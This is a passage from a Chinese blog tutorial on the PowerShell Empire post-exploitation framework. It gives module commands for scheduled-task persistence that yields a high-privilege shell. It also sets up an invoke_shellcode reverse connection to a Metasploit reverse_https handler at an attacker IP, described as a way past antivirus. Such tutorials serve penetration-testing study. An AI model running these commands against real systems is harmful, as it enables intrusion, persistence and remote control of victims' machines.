+<h4 id="3-计划任务获得系统权限"><a href="#3-计划任务获得系统权限" class="headerlink" title="**3.**计划任务获得系统权限"></a>**3.**计划任务获得系统权限</h4><p>输入usemodule persistence/elevated/schtasks，使用该模块，输入info命令查看具体参数，如下图所示。在实际渗透中，运行该模块时杀软会有提示。这里要设置DailyTime，Listener这2个参数，输入下列命令，设置完后输入execute命令运行，等设置的时间到后，成功返回一个高权限的shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set DailyTime 16:17</span><br><span class="line">Set Listener test</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<h2 id="9-Empire反弹回Metasploit"><a href="#9-Empire反弹回Metasploit" class="headerlink" title="9.  Empire反弹回Metasploit"></a>9.  Empire反弹回Metasploit</h2><p>实际渗透中，当拿到webshell上传的MSF客户端无法绕过目标机杀软时，可以使用powershell来绕过也可以执行Empire的payload来绕过，成功之后再使用Empire的模块将其反弹回Metasploit。</p>
+<p>这里使用usemodule code_execution/invoke_shellcode模块，输入info看下参数，这里修改2个参数，Lhost和Lport，Lhost修改为msf所在主机ip，按下列命令设置完毕。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set Lhost 192.168.31.247</span><br><span class="line">Set Lport 4444</span><br></pre></td></tr></table></figure>
+
+<p>在MSF上设置监听，命令如下，运行后，就可以收到Empire反弹回来的shell了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Use exploit/multi/handler</span><br><span class="line">Set payloadwindows/meterpreter/reverse_https</span><br><span class="line">Set Lhost 192.168.31.247</span><br><span class="line">Set lport 4444</span><br><span class="line">Run</span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87333#h2-1">【技术分享】一篇文章精通PowerShell Empire 2.3（下） - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/255216.html">内网渗透 day15-empire提权和后门植入 - FreeBuf网络安全行业门户</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">北孤清茶lth</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2022/05/24/empire%E4%BD%BF%E7%94%A8/">http://example.com/2022/05/24/empire%E4%BD%BF%E7%94%A8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">北孤清茶lthの博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/05/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"><img class="prev-cover" src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2022/05/24/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/"><img class="next-cover" src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">北孤清茶lth</div><div class="author-info__description">努力让生活更美好</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lth714"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lth714" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1306209041@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">这是我新搭建的博客，有很多不好的地方，请多多关照！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Empire%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Empire简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Empire%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E4%B8%8E%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">Empire的基本操作与使用教程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.</span> <span class="toc-text">1.安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%AE%BE%E7%BD%AE%E7%9B%91%E5%90%AC"><span class="toc-number">2.2.</span> <span class="toc-text">2.设置监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC"><span class="toc-number">2.3.</span> <span class="toc-text">3.生成木马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-dll"><span class="toc-number">2.3.1.</span> <span class="toc-text">1.dll</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-launcher"><span class="toc-number">2.3.2.</span> <span class="toc-text">2.launcher</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-launcher-vbs"><span class="toc-number">2.3.3.</span> <span class="toc-text">3.launcher_vbs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-launcher-bat"><span class="toc-number">2.3.4.</span> <span class="toc-text">4.launcher_bat</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-macro"><span class="toc-number">2.3.5.</span> <span class="toc-text">5.macro</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-Ducky"><span class="toc-number">2.3.6.</span> <span class="toc-text">6.Ducky</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%9E%E6%8E%A5%E4%BB%A3%E7%90%86%E5%8F%8A%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-number">2.4.</span> <span class="toc-text">4.连接代理及基本使用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.5.</span> <span class="toc-text">5. 信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%8F%90%E6%9D%83"><span class="toc-number">2.6.</span> <span class="toc-text">6. 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-bypassuac"><span class="toc-number">2.6.1.</span> <span class="toc-text">1.bypassuac</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-bypassuac-wscript"><span class="toc-number">2.6.2.</span> <span class="toc-text">2. bypassuac_wscript</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-ms16-032"><span class="toc-number">2.6.3.</span> <span class="toc-text">3. ms16-032</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-PowerUp"><span class="toc-number">2.6.4.</span> <span class="toc-text">4.PowerUp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#4-1-AllChecks-%E6%A8%A1%E5%9D%97"><span class="toc-number">2.6.4.1.</span> <span class="toc-text">4.1 AllChecks****模块</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-GPP"><span class="toc-number">2.6.5.</span> <span class="toc-text">5.GPP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">7. 横向渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="toc-number">3.0.1.</span> <span class="toc-text">1.令牌窃取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BC%9A%E8%AF%9D%E6%B3%A8%E5%85%A5"><span class="toc-number">3.0.2.</span> <span class="toc-text">**2.**会话注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Invoke-PsExec"><span class="toc-number">3.0.3.</span> <span class="toc-text">3.Invoke-PsExec</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-%E5%90%8E%E9%97%A8"><span class="toc-number">4.</span> <span class="toc-text">8. 后门</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E6%80%A7%E5%8A%AB%E6%8C%81shift%E5%90%8E%E9%97%A8"><span class="toc-number">4.0.1.</span> <span class="toc-text">**1.**权限持久性劫持shift后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.注册表注入后门</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E8%8E%B7%E5%BE%97%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90"><span class="toc-number">4.0.3.</span> <span class="toc-text">**3.**计划任务获得系统权限</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-Empire%E5%8F%8D%E5%BC%B9%E5%9B%9EMetasploit"><span class="toc-number">5.</span> <span class="toc-text">9.  Empire反弹回Metasploit</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" title="无题">无题</a><time datetime="2022-05-24T05:43:29.488Z" title="发表于 2022-05-24 13:43:29">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/empire%E4%BD%BF%E7%94%A8/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/empire%E4%BD%BF%E7%94%A8/" title="无题">无题</a><time datetime="2022-05-24T05:43:19.587Z" title="发表于 2022-05-24 13:43:19">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/%E5%85%8D%E6%9D%80%E4%B8%8A%E7%BA%BF/" title="无题">无题</a><time datetime="2022-05-24T05:43:06.204Z" title="发表于 2022-05-24 13:43:06">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/05/24/%E5%86%85%E7%BD%91%E5%A5%BD%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/05/24/%E5%86%85%E7%BD%91%E5%A5%BD%E7%94%A8%E7%9A%84%E5%8D%9A%E5%AE%A2/" title="无题">无题</a><time datetime="2022-05-24T05:42:40.146Z" title="发表于 2022-05-24 13:42:40">2022-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/" title="无题"><img src="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2022/01/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%91%BD%E4%BB%A4/" title="无题">无题</a><time datetime="2022-01-17T05:27:19.293Z" title="发表于 2022-01-17 13:27:19">2022-01-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By 北孤清茶lth</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">你好，欢迎来到我的 <a target="_blank" rel="noopener" href="http://c-hasel.cn/">博客</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
